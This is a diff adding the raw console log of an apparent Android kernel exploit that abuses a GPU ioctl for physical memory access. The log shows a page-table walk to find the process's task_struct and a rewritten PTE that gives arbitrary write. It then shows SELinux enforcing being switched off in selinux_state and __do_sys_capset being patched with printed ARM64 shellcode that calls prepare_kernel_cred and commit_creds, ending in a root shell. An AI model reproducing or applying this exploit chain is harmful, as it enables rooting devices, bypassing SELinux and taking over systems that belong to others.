@@ -1,0 +1,231 @@
+Current process PID: 11612
+Using phyaddr: 0x96a7d0000
+found it: virt addr = 0x76caf53000, phyaddr = 0x96a7d0000
+read output: 149a7fff
+kernel entry = aa6a0000
+target_read_physical_address = aa68b010
+CP_MEMCPY read for swapper_pg_dir successful.
+second read sentinel: 41414141
+second read value: 0
+second read value: 0
+second read value: 0
+second read value: 0
+second read value: 0
+second read value: 0
+second read value: 0
+second read value: 0
+second read value: 0
+second read value: 0
+second read value: 0
+second read value: aa690003
+found CHEESE_SWAPPER_PG_DIR_OFF=0x2694000
+Found init_task_phys: 0xaa9abe00
+Found swapper_pg_dir_phys: 0xaa694000
+get_curr_task_struct: Called with cheese: 0x7fe3cc3960, init_task_phys: 0xaa9abe00
+Starting task list backward traversal from init_task_phys: 0xaa9abe00
+get_curr_task_struct: Processing task at phys addr: 0xaa9abe00 (iteration 0)
+R64 fail@aa9ac3c8: marker(low) got=45454545
+gpu_command ioctl err: Resource deadlock would occur (ctx=5 ts=0)
+DoWrite: EDEADLK on ctx=5, recreating context
+ctx_recreate: ctx 5 -> 5 (EDEADLK self-heal)
+Found task PID: 0 at phys: 0xaa9abe00
+get_curr_task_struct: Reading prev task pointer from: 0xaa9ac2d0
+Prev task VA in list: 0xffffff803e3484c8
+Using kernel_va_to_pa for first conversion to establish offset
+walk_page_table: VA=0xffffff803e3484c8, PGD index=0, PGD entry addr=0xaa694000
+walk_page_table: PGD entry value=0xa793fa003
+walk_page_table: PMD addr=0xa793fa000, PMD index=497, PMD entry addr=0xa793faf88
+walk_page_table: PMD entry value=0xa7931e003
+walk_page_table: PTE addr=0xa7931e000, PTE index=328, target PTE addr=0xa7931ea40
+kernel_va_to_pa: Page table walk: KVA 0xffffff803e3484c8 -> PA 0xbe3484c8 (PTE=0x680000be348707)
+First conversion: VA 0xffffff803e3484c8 -> PA 0xbe3484c8
+Calculated kernel offset: 0x8080000000
+get_curr_task_struct: Processing task at phys addr: 0xbe348000 (iteration 1)
+Found task PID: 11612 at phys: 0xbe348000
+*** Found current process (PID 11612) task_struct at physical address: 0xbe348000 ***
+Current task_struct physical address: 0xbe348000
+Mapped pages at 0x7792482000 and 0x7792483000
+mm_struct (kernel VA) = 0xffffff8798347440
+Using page table walk to convert mm VA to PA
+walk_page_table: VA=0xffffff8798347440, PGD index=30, PGD entry addr=0xaa6940f0
+walk_page_table: PGD entry value=0xa79172003
+walk_page_table: PMD addr=0xa79172000, PMD index=193, PMD entry addr=0xa79172608
+walk_page_table: PMD entry value=0xa790b0003
+walk_page_table: PTE addr=0xa790b0000, PTE index=327, target PTE addr=0xa790b0a38
+kernel_va_to_pa: Page table walk: KVA 0xffffff8798347440 -> PA 0x818347440 (PTE=0x68000818347707)
+mm_struct PA = 0x818347440
+Reading pgd from PA 0x818347488
+mm_pgd (kernel VA) = 0xffffff88bdb66000
+Converting pgd VA to PA
+walk_page_table: VA=0xffffff88bdb66000, PGD index=34, PGD entry addr=0xaa694110
+walk_page_table: PGD entry value=0xa789a1003
+walk_page_table: PMD addr=0xa789a1000, PMD index=493, PMD entry addr=0xa789a1f68
+walk_page_table: PMD entry value=0xa787b3003
+walk_page_table: PTE addr=0xa787b3000, PTE index=358, target PTE addr=0xa787b3b30
+kernel_va_to_pa: Page table walk: KVA 0xffffff88bdb66000 -> PA 0x93db66000 (PTE=0x6800093db66707)
+mm_pgd PA = 0x93db66000
+PGD offset for map address 0x7792482000: 0xef0
+PGD entry = 0x9f6dd5003
+PMD entry = 0x8ef609003
+PTE addr A: 0x8ef609410, PTE addr B: 0x8ef609418
+PTE table physical address: 0x8ef609000
+Checking PTEs for both pages:
+PTE A = 0xe8000a7ee9ef43, PTE B = 0xe8000a7ee9ff43
+Physical address from PTE A: 0xa7ee9e000
+Physical address from PTE B: 0xa7ee9f000
+yes both are in same pagetable (PTE)
+INFO: Physical pages are consecutive.
+Original PTE B: 0xe8000a7ee9ff43
+New PTE B:      0xe80008ef609f43
+  Physical addr field: 0xa7ee9f000 -> 0x8ef609000
+  AP bits [7:6]: 0x1 -> 0x1
+About to write new PTE to 0x8ef609418
+This will make page_map (at 0x7792483000) point to the PTE table
+Writing PTE as two dwords: 0xef609f43 0xe80008
+Write submitted, waiting for completion...
+Read back PTE from 0x8ef609418: 0xe80008ef609f43
+pte wait 3 second show countdown
+3 2 1 
+Write completed successfully
+Attempting to disable SELinux...
+idmap_pg_dir_phys: 0xaa68f000
+selinux_state physical address: 0xaac51b20
+(calculated as idmap_pg_dir_phys + 0x5c2b20)
+Reading current selinux_state enforcing field from physical address 0xaac51b20
+Original 64-bit value at selinux_state: 0x10101010001
+  enforcing (byte 0): 1
+  checkreqprot (byte 1): 0
+  initialized (byte 2): 1
+New 64-bit value to write: 0x10101010000
+Writing modified value to physical address 0xaac51b20 using PTE mapping
+Original PTE A: 0xe8000a7ee9ef43
+New PTE for selinux_state page: 0xaac51443
+PTE A overwritten. map should now point to selinux_state's page.
+Writing new value 0x10101010000 to mapped address 0x7792482b20
+CPU verification read from mapped address 0x7792482b20
+CPU verification read: 0x10101010000
+  enforcing (byte 0): 0
+Restored original PTE A.
+SUCCESS: SELinux enforcing disabled!
+Fast RW initialized: map=0x7792482000, page_map=0x7792483000, pte_a_index=130
+
+[=== SELinux disabled, setting up kallsyms ===]
+Kernel image_size from header: 0x2c90000 (44 MB)
+Kernel size: 0x2c90000 (44 MB)
+Reading kernel from PA 0xa8000000 into buffer at 0xb40000778f7f1000
+  Read 1 / 44 MB
+  Read 2 / 44 MB
+  Read 3 / 44 MB
+  Read 4 / 44 MB
+  Read 5 / 44 MB
+  Read 6 / 44 MB
+  Read 7 / 44 MB
+  Read 8 / 44 MB
+  Read 9 / 44 MB
+  Read 10 / 44 MB
+  Read 11 / 44 MB
+  Read 12 / 44 MB
+  Read 13 / 44 MB
+  Read 14 / 44 MB
+  Read 15 / 44 MB
+  Read 16 / 44 MB
+  Read 17 / 44 MB
+  Read 18 / 44 MB
+  Read 19 / 44 MB
+  Read 20 / 44 MB
+  Read 21 / 44 MB
+  Read 22 / 44 MB
+  Read 23 / 44 MB
+  Read 24 / 44 MB
+  Read 25 / 44 MB
+  Read 26 / 44 MB
+  Read 27 / 44 MB
+  Read 28 / 44 MB
+  Read 29 / 44 MB
+  Read 30 / 44 MB
+  Read 31 / 44 MB
+  Read 32 / 44 MB
+  Read 33 / 44 MB
+  Read 34 / 44 MB
+  Read 35 / 44 MB
+  Read 36 / 44 MB
+  Read 37 / 44 MB
+  Read 38 / 44 MB
+  Read 39 / 44 MB
+  Read 40 / 44 MB
+  Read 41 / 44 MB
+  Read 42 / 44 MB
+  Read 43 / 44 MB
+  Read 44 / 44 MB
+Kernel read complete
+Failed to open kernel.dump for writing.
+Parsing kallsyms from buffer...
+Kallsyms parsed successfully
+Kernel _text virtual address: 0xffffffe6df000000
+VA to PA offset: 0x19c9000000
+init_cred virtual address: 0xffffffe6e19c0670
+commit_creds virtual address: 0xffffffe6df1819e4
+prepare_kernel_cred virtual address: 0xffffffe6df182478
+__do_sys_capset virtual address: 0xffffffe6df13e9a0
+__do_sys_capset physical address: 0xa813e9a0
+save... (via GPU read)
+Original __do_sys_capset code:
+  [00] d503233f
+  [04] d10203ff
+  [08] f800865e
+  [0c] a9047bfd
+  [10] a9055ff8
+  [14] a90657f6
+  [18] a9074ff4
+  [1c] 910103fd
+  [20] f00142c8
+  [24] f946a508
+  [28] aa0103f4
+  [2c] 910073e1
+  [30] aa0003f5
+  [34] f81f83a8
+  [38] a902ffff
+  [3c] f90013ff
+  [40] b9001fff
+  [44] a900ffff
+  [48] f90003ff
+  [4c] 94000110
+  [50] 34000060
+  [54] 93407c00
+  [58] 1400003c
+  [5c] d5384113
+Shellcode to write:
+  [00] d503233f
+  [04] a9bf7bfd
+  [08] 910003fd
+  [0c] d5384100
+  [10] f9400001
+  [14] 9274f821
+  [18] f9000001
+  [1c] f904241f
+  [20] f904281f
+  [24] d2800000
+  [28] 58000041
+  [2c] 14000003
+  [30] df182478
+  [34] ffffffe6
+  [38] d63f0020
+  [3c] 58000041
+  [40] 14000003
+  [44] df1819e4
+  [48] ffffffe6
+  [4c] d63f0020
+  [50] 2a1f03e0
+  [54] a8c17bfd
+  [58] d50323bf
+  [5c] d65f03c0
+patch... (via CPU write)
+Clearing caches for patched code...
+Caches cleared.
+call...
+called...
+UID: 0, EUID: 0
+restore... (via CPU write)
+Clearing caches for restored code...
+restored...
+uid=0(root) gid=0(root) groups=0(root) context=u:r:shell:s0
